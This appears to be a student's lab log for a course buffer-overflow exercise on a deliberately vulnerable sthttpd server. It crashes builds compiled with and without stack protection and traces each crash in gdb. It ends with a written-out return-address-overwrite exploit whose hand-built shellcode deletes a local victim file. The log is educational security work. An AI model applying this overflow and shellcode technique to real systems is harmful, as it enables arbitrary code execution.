@@ -1,0 +1,497 @@
+made sure path was current
+$ export PATH=:/usr/local/cs/bin:$PATH
+checked 
+$ which gcc 
+
+created patch files
+$ vim patch_file1
+$ vim patch_file2
+and copied and pasted patches into the file
+
+downloaded the sthttpd 2.27.0
+$ wget https://web.cs.ucla.edu/classes/fall18/cs33/lab/sthttpd-2.27.0.tar.gz
+
+unzipped file
+$ tar -xzf sthttpd-2.27.0.tar.gz
+
+applied patches
+$ patch -p0 < patch_file1
+$ patch -p0 < patch_file2
+checked if it worked by looking at libhttpd.c and thttpd.c
+$ sed -n 999,1030p src/thttpd.c
+$ sed -n 4078,4082p src/libhttpd.c
+
+
+
+
+
+
+configured it using command given
+$ ./configure \
+   LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"
+
+compiled it 3 times
+$ make clean
+$ make CFLAGS='-g3 -O2 -fno-inline -fstack-protector-strong'
+$ mv src/thttpd src/thttpd-sp
+
+$ make clean
+$ make CFLAGS='-g3 -O2 -fno-inline -fsanitize=address'
+$ mv src/thttpd src/thttpd-as
+
+$ make clean
+$ make CFLAGS='-g3 -O2 -fno-inline -fno-stack-protector -zexecstack'
+$ mv src/thttpd src/thttpd-no
+
+
+
+
+running SP in window 1
+(12330 + 3 * (604905807 % 293) + 1) = 13156
+$ src/thttpd-sp -p 13156 -D
+
+running AS in window 2
+(12330 + 3 * (604905807 % 293) + 2) = 13157
+$ src/thttpd-as -p 13157 -D
+
+running NO in window 3
+(12330 + 3 * (604905807 % 293) + 3) = 13158
+$ src/thttpd-no -p 13158 -D
+
+created foo.txt in window 4 to find out more
+$ echo "yes" > foo.txt
+
+checked up on them
+$ curl http://localhost:13156/foo.txt
+$ curl http://localhost:13157/foo.txt
+$ curl http://localhost:13158/foo.txt
+
+src/thttpd-as doesn't work. Error code says 
+wrong ELF class: ELFCLASS32
+checked pizza, so going to try to use -static-libasan
+$ make clean
+$ make CFLAGS='-g3 -O2 -fno-inline -fsanitize=address -static-libasan'
+$ mv src/thttpd src/thttpd-as
+
+trying agian
+$ src/thttpd-as -p 13157 -D
+$ curl http://localhost:13157/foo.txt
+works!
+
+
+
+
+
+
+
+
+now trying to make SP crash:
+in the patch, the function is changed to read 1000 characters
+from the file inputted. yet, the character array is 
+changed to only be able to hold 100 of these characters.
+
+thus we should expect that 
+if we read in a file with more than 100 characters, 
+the function will continue reading (for 1000 chars)
+which will cause there to be a memory problem!
+
+first let's find out when read_config is called
+$ cat src/thttpd.c | grep -n 'read_config('
+found out it's called in line 893 and 999
+
+looking in file now
+$ sed -n 860,900p src/thttpd.c
+found out to use -C option when using thttpd
+makes sense. so we just have to input a 100+ char file
+
+making character file
+$ vim file.txt
+tried different things to put into file.txt,
+but gave error because my random letters weren't config options
+apparently we still need an option to "disguise" file.txt 
+as a config file. So I just found a option to use and
+filled the file up with option that's longer than 100 chars
+(used the "dir" option)
+dir=feslfjefoiejeosjfiosejfojdmeinieowjoijioje
+wtoiejiocmveiogwjteijfioejvoinwionvioewnigneov
+noivenoivnwioentiojweoifjiowengioengwegegwed
+
+running it now
+$ src/thttpd-sp -p 13156 -D -C file.txt
+*** stack smashing detected ***: src/thttpd-sp terminated
+Segmentation fault
+
+running gdb to do a backtrace
+$ gdb src/thttpd-sp
+(gdb) r -p 13156 -D -C file.txt
+crashes as expected
+
+backtracing 
+(gdb) bt
+#0  0x00007ffff6da50b8 in ?? () from /lib64/libgcc_s.so.1
+#1  0x00007ffff6da5fb9 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
+#2  0x00007ffff76e3ba6 in backtrace () from /lib64/libc.so.6
+#3  0x00007ffff7647ce4 in __libc_message () from /lib64/libc.so.6
+#4  0x00007ffff76e7677 in __fortify_fail () from /lib64/libc.so.6
+#5  0x00007ffff76e7632 in __stack_chk_fail () from /lib64/libc.so.6
+#6  0x0000000000404165 in read_config (filename=<optimized out>) at thttpd.c:1129
+#7  0x676b666a676b646e in ?? ()
+#8  0x6575746f6965726a in ?? ()
+#9  0x6f69657475696f77 in ?? ()
+#10 0x6a766b64736e6366 in ?? ()
+#11 0x00000065666a6c65 in ?? ()
+#12 0x00007fffffffe110 in ?? ()
+#13 0x0000000000000000 in ?? ()
+
+as we expected, read_config causes the error.
+and it seemed like our file.txt stepped all over the 
+memory of the remaining functions
+
+we know error happens in read_config
+so let's set a breakpoint there
+(gdb) b read_config
+(gdb) s
+until it crashes
+
+   0x0000000000404045 <read_config+1141>:	4c 89 f7	mov    %r14,%rdi
+   0x0000000000404048 <read_config+1144>:	e8 33 e3 ff ff	callq  0x402380 <fclose@plt>
+   0x000000000040404d <read_config+1149>:	48 8b 44 24 68	mov    0x68(%rsp),%rax
+   0x0000000000404052 <read_config+1154>:	64 48 33 04 25 28 00 00 00	xor    %fs:0x28,%rax
+=> 0x000000000040405b <read_config+1163>:	0f 85 ff 00 00 00	jne    0x404160 <read_config+1424>
+
+and we can guess that the function jumped to the crash function here
+so it crashed, but don't know why
+
+googled how "stong" stack protection works for GCC:
+"The basic idea behind stack protection is to push a "canary" 
+(a randomly chosen integer) on the stack just after 
+the function return pointer has been pushed. 
+The canary value is then checked before the function returns; 
+if it has changed, the program will abort. 
+Generally, stack buffer overflow (aka "stack smashing") 
+attacks will have to change the value of the canary as they 
+write beyond the end of the buffer before they 
+can get to the return pointer. 
+Since the value of the canary is unknown to the attacker, 
+it cannot be replaced by the attack. 
+Thus, the stack protection allows the program to abort 
+when that happens rather than return to wherever the attacker wanted it to go."
+https://lwn.net/Articles/584225/
+
+so the xor was to check if the canary changed
+then it jumped to the exit code since it was changed
+
+
+
+
+
+
+
+
+now trying to make AS crash:
+$ src/thttpd-as -p 13157 -D -C file.txt
+==45116==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fff8a533974 at pc 0x00000048a72c bp 0x7fff8a5338d0 sp 0x7fff8a533080
+
+$ gdb src/thttpd-as
+(gdb) r -p 13157 -D -C file.txt
+crashes like normal
+
+backtracing
+(gdb) bt
+No stack.
+
+interesting....
+trying the same thing because I'm assuming 
+the crash is going to be in the same function
+(gdb) b read_config
+(gdb) r -p 13157 -D -C file.txt
+
+(gdb) s
+until it crashes
+nevermind. I entered s like 200 times
+
+going to line where file is being read: 1015
+trying again:
+$ gdb src/thttpd-as
+(gdb) b 1014
+(gdb) r -p 13157 -D -C file.txt
+pressed s like 10000 times....
+
+this is the last function:
+__interceptor_strchr (s=<optimized out>, c=<optimized out>)
+
+looking at gcc documentation:
+https://gcc.gnu.org/onlinedocs/gcc/Instrumentation-Options.html
+"Memory access instructions are instrumented to detect out-of-bounds and use-after-free bugs."
+
+from this, we can infer that this interceptor function is an external function 
+that checks whether memory is out of bounds or is overflowed
+
+
+
+
+
+
+
+
+
+now trying to crash NO:
+$ src/thttpd-no -p 13158 -D -C file.txt
+Segmentation fault
+
+$ gdb src/thttpd-no
+(gdb) r -p 13158 -D -C file.txt
+crashes like normal
+
+backtracing again
+(gdb) bt
+#0  0x0000000000403f79 in read_config (filename=<optimized out>) at thttpd.c:1189
+#1  0x676b666a676b646e in ?? ()
+#2  0x6575746f6965726a in ?? ()
+#3  0x6f69657475696f77 in ?? ()
+#4  0x6a766b64736e6366 in ?? ()
+#5  0x00000065666a6c65 in ?? ()
+#6  0x00007fffffffe110 in ?? ()
+#7  0x0000000000000000 in ?? ()
+
+looks like it crashed at line 1189
+setting breakpoint at 1189
+(gdb) b 1189
+(gdb) r -p 13158 -D -C file.txt
+
+(gdb) s
+Single stepping until exit from function do_lookup_x,
+which has no line number information.
+0x00007ffff763ce60 in fclose@@GLIBC_2.2.5 () from /lib64/libc.so.6
+
+so it looks like this function crashed when trying to return
+this is because the return address was overwrittern
+so it wasn't able to find out where to return to
+
+
+
+
+
+
+
+
+compiled it 3 times
+$ make clean
+$ make CFLAGS='-S -O2 -fno-inline -fstack-protector-strong'
+$ mv src/thttpd.o src/thttpd-sp.s
+
+$ make clean
+$ make CFLAGS='-S -O2 -fno-inline -fsanitize=address'
+$ mv src/thttpd.o src/thttpd-as.s
+
+$ make clean
+$ make CFLAGS='-S -O2 -fno-inline -fno-stack-protector -zexecstack'
+$ mv src/thttpd.o src/thttpd-no.s
+
+
+comparing all 3:
+$ cat src/thttpd-sp.s | grep -n 'handle_read'
+line 2575
+$ sed -n '2575,2770p' src/thttpd-sp.s > hd-sp.s
+(i tediously looked for the length of the handle_read
+function by testing out different lines to look at using sed)
+
+$ cat src/thttpd-as.s | grep -n 'handle_read'
+line 4458
+$ sed -n '4458,4995p' src/thttpd-as.s > hd-as.s
+
+$ cat src/thttpd-no.s | grep -n 'handle_read'
+line 2531
+$ sed -n '2531,2726p' src/thttpd-no.s > hd-no.s
+
+looked at all three files side by side
+AS is definitely longer than the other, 
+since it needs to call to other function to check
+if memory is out of bounds
+SP and NO are more similar 
+
+$ diff hd-no.s hd-sp.s 
+shows that the only differences are the locations they jump to
+
+
+
+
+
+
+
+
+
+
+
+
+NO fails because continuing to read in memory despite not allocating
+enough memory in the stack overwrites the return address.
+the 100-108th bytes that's read in from file.txt become the return address
+of the function
+
+so how about we use this to our advantage and use that return address to point back to some code that will delete victim.txt
+
+and where should we return it to?
+
+where should we return it to?
+how about something that we have free reign over: 
+the config file itself (file.txt)!
+
+so we just have some assembly code in file.txt that will delete victim.txt
+and have the return address point there
+
+
+
+
+$ touch victim.txt
+
+first to figure out how big the frame of read_config is
+$ gdb src/thttpd-no
+(gdb) b read_config
+(gdb) r -p 13158 -D -C file.txt
+
+finding stack size:
+first printing out how big it is
+(gdb) print &line
+$1 = (char (*)[100]) 0x7fffffffcde0
+then how big stack is
+(gdb) info r
+rsp            0x7fffffffce78	0x7fffffffce78
+
+0x7fffffffce78 - 0x7fffffffcde0 = 0x98
+or 152 bytes
+
+this is the distance from the beginning of the stack to 
+the return address of the function. so adding 8 bytes for the
+return address gives us space of length 160 to work with: plenty
+
+this file will run the assembly code we put into it (hopefully)
+so our goal is to find some assembly code that will delete victim.txt
+
+
+
+
+first:
+we still need to simulate the config file
+so let's use the "dir=" option again
+
+use xxd (found online) to find hexadecimal representation of "dir="
+$ echo dir= | xxd
+0000000: 6469 723d 0a                             dir=.
+
+so first 8 bytes is 
+64 69 72 3d 00 00 00 00
+since we need to add 4 bytes for the 8 byte alignment
+
+
+
+
+
+second: 
+find code that deletes a file
+heard about unlink function from a TA
+so let's find out what assembly code it has
+
+creating file
+$ vim unlink.c
+#include <unistd.h>
+int main() {
+	unlink("victim.txt");
+	return 0;
+}
+
+finding the assembly code
+$ gcc -o a.out unlink.c
+$ gdb ./a.out
+(gdb) b unlink
+(gdb) r
+48 c7 c0 57 00 00 00 	mov    $0x57,%rax
+0f 05                	syscall
+
+but let's input victim.txt in as the first argument of unlink.
+so move hexadecimal representation of victim.txt into %rdi.
+we use movabs, whose assembly code is 48 bf followed by address 
+of stored name
+
+thus the next 24 bytes are
+48 bf xx xx xx xx xx xx
+00 00 48 c7 c0 57 00 00
+00 0f 05 00 00 00 00 00
+
+where xx xx xx xx xx xx represents the address of
+hexadecimal representation of  victim.txt
+
+
+
+now to place victim.txt somewhere
+find out the hex representation of victim.txt
+$ echo victim.txt | xxd
+0000000: 7669 6374 696d 2e74 7874 0a              victim.txt.
+
+let's place victim.txt after unlink command:
+next 16 bytes are
+76 69 63 74 69 6d 2e 74
+78 74 00 00 00 00 00 00
+
+and we can replace xx xx xx xx xx xx
+with 0x7fffffffce78 (start of stack) - 0x20 (space already used) = 0x7fffffffce58
+58 ce ff ff ff 7f
+
+
+
+fourth:
+let's return to the beginning of the unlink function
+last 8 bytes is return code
+0x7fffffffcde0 (end of stack) + 0x10 (size of return address) = 0x7fffffffcde8
+
+last 8 bytes is (little endian):
+e8 cd ff ff ff 7f 00 00 
+
+
+lastly:
+we've so far used 48 + 8 bytes = 56
+thus we need to fill up remaining 160 - 56 = 104 bytes with 00
+
+
+64 69 72 3d 00 00 00 00
+48 bf xx xx xx xx xx xx
+00 00 48 c7 c0 57 00 00
+76 69 63 74 69 6d 2e 74
+78 74 00 00 00 00 00 00
+00 0f 05 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+e8 cd ff ff ff 7f 00 00
+
+now formatting to .s file
+0000000: 64 69 72 3d 00 00 00 00 48 bf 58 ce ff ff ff 7f
+0000010: 00 00 48 c7 c0 57 00 00 00 0f 05 00 00 00 00 00
+0000020: 76 69 63 74 69 6d 2e 74 78 74 00 00 00 00 00 00
+0000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+0000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+0000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+0000060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+0000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+0000080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+0000090: 00 00 00 00 00 00 00 00 e8 cd ff ff ff 7f 00 00
+converting back to text file
+$ xxd -r format.txt file.txt
+
+then test it out
+$ src/thttpd-no -p 13158 -D -C file.txt
+
+works! since it deleted victim.txt
+
+
+
